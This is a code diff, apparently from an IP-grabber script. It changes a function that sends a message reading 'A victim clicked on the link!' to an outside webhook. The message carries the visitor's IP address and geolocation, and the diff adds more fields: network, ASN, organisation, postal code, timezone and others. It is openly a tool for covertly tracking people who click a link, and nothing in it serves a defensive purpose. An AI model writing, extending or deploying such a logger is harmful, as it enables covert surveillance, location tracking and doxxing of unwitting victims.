@@ -17,7 +17,7 @@ const sendIP = () => {
                         body: JSON.stringify({
                             username: "site logger <3", // optionally changeable
                             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
-                            content: `A victim clicked on the link! @here\n=====================\nIPv4 Address >> ${ipadd}\nCountry >> ${geoData.country_name}\nRegion/State >> ${geoData.region}\nCity/Town >> ${geoData.city}\nLatitude >> ${geoData.latitude}\nLongitude >> ${geoData.longitude}\n=====================\nᓚᘏᗢ - e l k w a s h e r e -`
+                            content: `A victim clicked on the link! @here\n=====================\nIP Address >> ${ipadd}\nNetwork >> ${geoData.network}\nCountry >> ${geoData.country_code}/${geoData.country_name}\nRegion/State >> ${geoData.region}\nCity/Town >> ${geoData.city}\nLatitude >> ${geoData.latitude}\nLongitude >> ${geoData.longitude}\nTimeZone >> ${geoData.timezone}\nPostal Code >> ${geoData.postal}\nLanguages >> ${geoData.languages}\nCurrency >> ${geoData.currency}/${geoData.currency_name}\nASN >> ${geoData.asn}\nORG >> ${geoData.org}\n=====================\nᓚᘏᗢ - e l k w a s h e r e -`
                         })
                     });
                 });
